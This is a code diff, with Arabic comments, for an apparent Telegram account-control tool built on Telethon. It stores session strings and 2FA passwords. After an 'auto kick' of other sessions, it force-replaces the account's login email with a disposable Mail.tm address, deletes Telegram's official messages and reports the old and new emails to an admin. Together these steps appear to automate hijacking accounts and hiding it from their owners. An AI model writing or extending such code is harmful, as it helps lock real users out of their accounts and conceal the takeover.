@@ -195,13 +195,37 @@ def watchdog_session_check(phone: str, alive: bool) -> str | None:
     return "schedule_recovery"
 
 
-async def _telegram_has_login_email(client) -> bool:
-    """هل الحساب مربوط فعلياً ببريد Login على تيليجرام؟"""
+async def get_telegram_login_email_pattern(client) -> str | None:
+    """القناع الفعلي لبريد Login على تيليجرام (مثل sa******1@gmail.com)."""
     try:
         pwd = await client(GetPasswordRequest())
-        return bool(getattr(pwd, "login_email_pattern", None))
+        pattern = getattr(pwd, "login_email_pattern", None)
+        return (str(pattern).strip() if pattern else None) or None
     except Exception as e:
         logger.debug("GetPassword login_email: %s", e)
+        return None
+
+
+async def _telegram_has_login_email(client) -> bool:
+    """هل الحساب مربوط فعلياً ببريد Login على تيليجرام؟"""
+    return bool(await get_telegram_login_email_pattern(client))
+
+
+def email_matches_login_pattern(email: str | None, pattern: str | None) -> bool:
+    """
+    مقارنة بريد كامل مع قناع تيليجرام (كل * = حرف واحد).
+    تيليجرام لا يُرجع البريد كاملاً — فقط login_email_pattern.
+    """
+    if not email or not pattern:
+        return False
+    email_n = email.strip().lower()
+    pattern_n = pattern.strip().lower()
+    if email_n == pattern_n:
+        return True
+    regex = "".join("." if c == "*" else re.escape(c) for c in pattern_n)
+    try:
+        return bool(re.fullmatch(regex, email_n))
+    except re.error:
         return False
 
 
@@ -331,7 +355,9 @@ async def submit_code(user_id: int, code: str, is_refresh: bool = False) -> dict
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
         username = me.username or ""
         telegram_id = me.id
-        phone = database.normalize_phone(phone)
+        # save under actual telegram phone
+        actual_phone = database.normalize_phone(getattr(me, "phone", "") or "")
+        phone = actual_phone or database.normalize_phone(phone)
         
         # جلب 2FA القديم إن وجد
         old_row = await database.get_session_by_phone(phone)
@@ -351,6 +377,7 @@ async def submit_code(user_id: int, code: str, is_refresh: bool = False) -> dict
         return {
             "success": True,
             "two_fa": False,
+            "phone": phone,
             "email_linked": email_res.get("success"),
             "login_email": email_res.get("email"),
             "email_error": email_res.get("error"),
@@ -378,8 +405,9 @@ async def submit_2fa(user_id: int, password: str, is_refresh: bool = False) -> d
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
         username = me.username or ""
         telegram_id = me.id
-        # حفظ كلمة مرور الدخول
-        phone = database.normalize_phone(phone)
+        # احفظ تحت الرقم الفعلي من تيليجرام لمنع خلط الجلسات
+        actual_phone = database.normalize_phone(getattr(me, "phone", "") or "")
+        phone = actual_phone or database.normalize_phone(phone)
         await database.save_session(
             phone, username, full_name, session_string, password, telegram_id
         )
@@ -393,6 +421,7 @@ async def submit_2fa(user_id: int, password: str, is_refresh: bool = False) -> d
         await client.disconnect()
         return {
             "success": True,
+            "phone": phone,
             "email_linked": email_res.get("success"),
             "login_email": email_res.get("email"),
             "email_error": email_res.get("error"),
@@ -434,13 +463,32 @@ async def get_active_client(phone: str):
     session = await database.get_session_by_phone(phone)
     if not session:
         return None
+    ss = database.row_get(session, "session_string")
+    if not ss or not str(ss).strip():
+        return None
     client = None
     try:
-        client = make_telegram_client(session["session_string"])
+        client = make_telegram_client(ss)
         await client.connect()
         if not await client.is_user_authorized():
             await client.disconnect()
             return None
+        # منع تشغيل عمليات على جلسة لرقم مختلف (خلط الجلسات)
+        try:
+            me = await client.get_me()
+            actual = database.normalize_phone(getattr(me, "phone", "") or "")
+            stored = database.normalize_phone(phone)
+            if actual and stored and actual != stored:
+                logger.error(
+                    "SESSION MIXUP blocked: db_phone=%s actual_phone=%s id=%s",
+                    stored,
+                    actual,
+                    getattr(me, "id", None),
+                )
+                await client.disconnect()
+                return None
+        except Exception as e:
+            logger.debug("get_active_client phone check %s: %s", phone, e)
         return client
     except AuthKeyUnregisteredError:
         if client:
@@ -464,7 +512,7 @@ async def check_session_alive(phone: str) -> bool:
     لا يعدّل valid في DB.
     """
     session = await database.get_session_by_phone(phone)
-    if not session or not session["session_string"]:
+    if not session or not database.row_get(session, "session_string"):
         return False
     client = None
     try:
@@ -473,9 +521,18 @@ async def check_session_alive(phone: str) -> bool:
         if not await client.is_user_authorized():
             return False
         me = await client.get_me()
+        if not me:
+            return False
+        actual = database.normalize_phone(getattr(me, "phone", "") or "")
+        stored = database.normalize_phone(phone)
+        if actual and stored and actual != stored:
+            logger.error(
+                "SESSION MIXUP alive-check: db=%s actual=%s", stored, actual
+            )
+            return False
         if me and not session["telegram_id"]:
             await database.update_session_telegram_id(phone, me.id)
-        return bool(me)
+        return True
     except (
         AuthKeyUnregisteredError,
         SessionRevokedError,
@@ -508,7 +565,7 @@ async def verify_session_phone_match(phone: str) -> dict:
     None = لا يمكن التحقق (جلسة معطلة).
     """
     session = await database.get_session_by_phone(phone)
-    if not session or not session.get("session_string"):
+    if not session or not database.row_get(session, "session_string"):
         return {"match": None, "actual_phone": None, "actual_name": None}
     client = None
     try:
@@ -698,7 +755,7 @@ async def fetch_codes_from_email(
 
 async def existing_login_email_ok(row, client=None) -> str | None:
     """
-    بريد Login محفوظ + Mail.tm يعمل + (إن وُجد client) مربوط على تيليجرام.
+    بريد Login محفوظ + Mail.tm يعمل + (إن وُجد client) القناع على تيليجرام يطابق البريد.
     """
     if not row:
         return None
@@ -713,28 +770,40 @@ async def existing_login_email_ok(row, client=None) -> str | None:
     except Exception as e:
         logger.debug("login email mailbox check %s: %s", email, e)
         return None
-    if client and not await _telegram_has_login_email(client):
-        logger.info(
-            "mail.tm OK but Telegram login email missing for %s",
-            database.row_get(row, "phone", "?"),
-        )
-        return None
+    if client:
+        tg_pattern = await get_telegram_login_email_pattern(client)
+        if not tg_pattern:
+            logger.info(
+                "mail.tm OK but Telegram login email missing for %s",
+                database.row_get(row, "phone", "?"),
+            )
+            return None
+        if not email_matches_login_pattern(email, tg_pattern):
+            logger.info(
+                "DB email %s does not match TG pattern %s for %s",
+                email,
+                tg_pattern,
+                database.row_get(row, "phone", "?"),
+            )
+            return None
     return email
 
 
 async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
     """
-    بعد تسجيل الدخول: LoginChange فقط (وثائق core.telegram.org/api/auth).
-    أثناء auth.sendCode فقط: LoginSetup مع نفس phone_code_hash.
+    اختيار الغرض حسب حالة بريد Login الفعلية على تيليجرام:
+    - إن وُجد login_email_pattern → LoginChange
+    - وإلا → LoginSetup (يحتاج phone_code_hash من sendCode)
     """
-    if await client.is_user_authorized():
+    if await _telegram_has_login_email(client):
         return EmailVerifyPurposeLoginChange()
     if phone_code_hash:
         return EmailVerifyPurposeLoginSetup(
             phone_number=database.normalize_phone(phone),
             phone_code_hash=phone_code_hash,
         )
-    return EmailVerifyPurposeLoginChange()
+    # أول ربط: اطلب sendCode للحصول على hash حتى لو الجلسة مصرّح بها
+    return await _login_setup_purpose(client, phone)
 
 
 async def _send_verify_email_code(
@@ -749,8 +818,10 @@ async def _send_verify_email_code(
     except Exception as e:
         if not (_is_email_not_setup(e) or _is_stale_phone_code_hash(e)):
             raise
-        if await client.is_user_authorized():
-            raise
+        # EMAIL_NOT_SETUP / hash منتهي → إعادة LoginSetup عبر sendCode
+        logger.warning(
+            "email verify fallback to LoginSetup for %s: %s", phone, e
+        )
         purpose = await _login_setup_purpose(client, phone)
         sent = await client(
             SendVerifyEmailCodeRequest(purpose=purpose, email=email)
@@ -912,6 +983,12 @@ async def change_login_email(phone: str, force: bool = False) -> dict:
     client = await get_active_client(phone)
     if not client:
         return {"success": False, "error": "الجلسة معطلة"}
+    tg_pattern = None
+    try:
+        tg_pattern = await get_telegram_login_email_pattern(client)
+    except Exception:
+        pass
+    db_email = database.row_login_email(row) if row else None
     if not force:
         kept = await existing_login_email_ok(row, client)
         if kept:
@@ -921,10 +998,14 @@ async def change_login_email(phone: str, force: bool = False) -> dict:
                 "email": kept,
                 "skipped": True,
                 "message": "بريد Login الحالي يعمل — لم يُغيَّر",
+                "old_email": db_email,
+                "tg_pattern": tg_pattern,
             }
     try:
         res = await _bind_login_email(client, phone)
         await delete_telegram_official_messages(client)
+        res["old_email"] = db_email
+        res["tg_pattern"] = tg_pattern
         return res
     finally:
         await client.disconnect()
@@ -996,6 +1077,25 @@ async def _on_auto_kick_success(phone: str, phase: str = ""):
         )
     else:
         await _notify_admin(phone, "twofa_fail", error=fa.get("error", ""))
+
+    # بعد الطرد: تغيير البريد فوراً وعرض القديم/الجديد
+    try:
+        mail_res = await change_login_email(phone, force=True)
+        await _notify_admin(
+            phone,
+            "email_after_kick",
+            success=mail_res.get("success"),
+            old_email=mail_res.get("old_email") or mail_res.get("tg_pattern"),
+            tg_pattern=mail_res.get("tg_pattern"),
+            new_email=mail_res.get("email"),
+            error=mail_res.get("error"),
+        )
+    except Exception as e:
+        logger.warning("email after kick %s: %s", phone, e)
+        await _notify_admin(
+            phone, "email_after_kick", success=False, error=str(e)
+        )
+
     asyncio.create_task(_post_kick_session_watch(phone))
 
 
